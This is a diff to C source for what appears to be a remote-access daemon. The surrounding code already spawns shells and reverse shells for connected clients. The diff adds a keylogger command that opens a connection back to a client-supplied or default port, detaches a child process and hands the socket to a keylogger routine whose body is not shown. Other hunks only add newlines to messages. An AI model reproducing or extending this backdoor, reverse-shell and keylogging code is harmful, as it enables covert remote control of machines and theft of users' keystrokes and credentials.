@@ -50,7 +50,7 @@ void				serverShell(t_cl *client, t_cmd *cmds)
 	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
 	client->shell = spawnShell(client->fd);
 	if (client->shell == -1)
-		clientWrite("Failed to spawn a shell...", client);
+		clientWrite("Failed to spawn a shell...\n", client);
 }
 
 static int			serverConnectShell(t_cl *client, char *port)
@@ -143,12 +143,48 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 			serverQuitClient(client, cmds);
 		} else {
 			serverLog("[ERRO] - %d: Failed to fork a new reverse shell.", client->fd);
-			clientWrite("Fork failed.", client);
+			clientWrite("Fork failed.\n", client);
 		}
 		close(fd);
 	} else {
 		clientWrite("$> ", client);
 	}
+}
+
+void			serverKeylogger(t_cl *client, t_cmd *cmds)
+{
+	char			**options;
+	char			*port;
+	int				fd;
+	pid_t			pid;
+
+	serverLog("[CMDS] - %d: Keylogger wanted.", client->fd);
+	options = mysplitwhitespaces(cmds->opt);
+	port = (options && options[1]) ? options[1] : SERVER_KEYLOG_PORT;
+	fd = serverConnectShell(client, port);
+	mytabdel(&options);
+	if (fd >= 0) {
+		pid = fork();
+		if (pid == 0) {
+			serverLog("[CMDS] - %d: Initialising Keylogger...", client->fd);
+			struct rlimit	rlim;
+
+			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
+				rlim.rlim_max = 4096;
+			for (size_t i = 0; i < rlim.rlim_max; i++) {
+				if (i != (size_t)fd)
+					close(i);
+			}
+			if (serverInitKeylogger(fd))
+				close(fd);
+			exit(0);
+		} else if (pid < 0) {
+			serverLog("[ERRO] - %d: Failed to fork a new reverse shell.", client->fd);
+			clientWrite("Fork failed.\n", client);
+		}
+		close(fd);
+	}
+	clientWrite("$> ", client);
 }
 
 void			serverPrintLogs(t_cl *client, t_cmd *cmds)
@@ -161,7 +197,7 @@ void			serverPrintLogs(t_cl *client, t_cmd *cmds)
 	serverLog("[CMDS] - %d: Logs wanted.", client->fd);
 	fd = open(SERVER_REPORTER, O_RDONLY);
 	if (fd < 0)
-		clientWrite("Failed to open logs...", client);
+		clientWrite("Failed to open logs...\n", client);
 	else {
 		while (1) {
 			ret = read(fd, buf, sizeof(buf) - 1);
